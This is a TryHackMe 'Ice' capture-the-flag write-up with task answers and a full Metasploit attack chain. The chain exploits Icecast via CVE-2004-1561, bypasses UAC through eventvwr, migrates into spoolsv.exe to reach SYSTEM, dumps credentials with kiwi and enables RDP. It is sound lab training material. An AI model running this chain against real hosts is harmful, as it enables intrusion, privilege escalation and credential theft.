# THM - Ice

<br>

## Task 2

```shell
mkdir nmap
sudo nmap -sS -p- 10.10.66.203 -oN nmap/initial
nmap -A -p- 10.10.66.203 -oN nmap/initial2
```

### Task 2.3

> 3389

<br>

### Task 2.4

> Icecast

<br>

### Task 2.5

> DARK-PC

<br>

## Task 3

### Task 3.1

🧰 https://www.cvedetails.com/

https://www.cvedetails.com/cve/CVE-2004-1561/

> Execute Code Overflow

<br>

### Task 3.2

> CVE-2004-1561

<br>

```shell
msfconsole
```

### Task 3.4

```shell
	search icecast
```

> exploit/windows/http/icecast_header

```shell
	use exploit/windows/http/icecast_header
```

<br>

### Task 3.6

```shell
		show options
```

> RHOSTS

```shell
		set LHOST 10.14.27.197
		set RHOSTS 10.10.66.203
		exploit
```

<br>

## Task 4

### Task 4.1

> meterpreter

<br>

### Task 4.2

```shell
			getuid
```

> Dark

<br>

### Task 4.3

```shell
			sysinfo
```

> 7601

<br>

### Task 4.4

> x64

```shell
			run post/multi/recon/local_exploit_suggester
```

<br>

### Task 4.6

> exploit/windows/local/bypassuac_eventvwr

<br>

```shell
			^Z
			y
		
		back
	use exploit/windows/local/bypassuac_eventvwr
		
		show options
		sessions
		set SESSION 1
```

### Task 4.10

> LHOST

```shell
		set LHOST 10.14.27.197
		
		run
```

<br>

### Task 4.14

```shell
			getprivs
```

> SeTakeOwnershipPrivilege

<br>

## Task 5

### Task 5.2

```shell
			ps
```

> spoolsv.exe

```shell
			migrate -N spoolsv.exe
```

<br>

### Task 5.4

```shell
			getuid
```

> NT AUTHORITY\SYSTEM

```shell
			load kiwi
			
			help
```

<br>

### Task 5.7

> creds_all

<br>

### Task 5.8

```shell
			creds_all
```

> Password01!

<br>

## Task 6

```shell
			help
```

### Task 6.2

> hashdump

<br>

### Task 6.3

> screenshare

<br>

### Task 6.4

> record_mic

<br>

### Task 6.5

> timestomp

<br>

### Task 6.6

> golden_ticket_create

<br>

```shell
			run post/windows/manage/enable_rdp
```

https://www.exploit-db.com/exploits/568

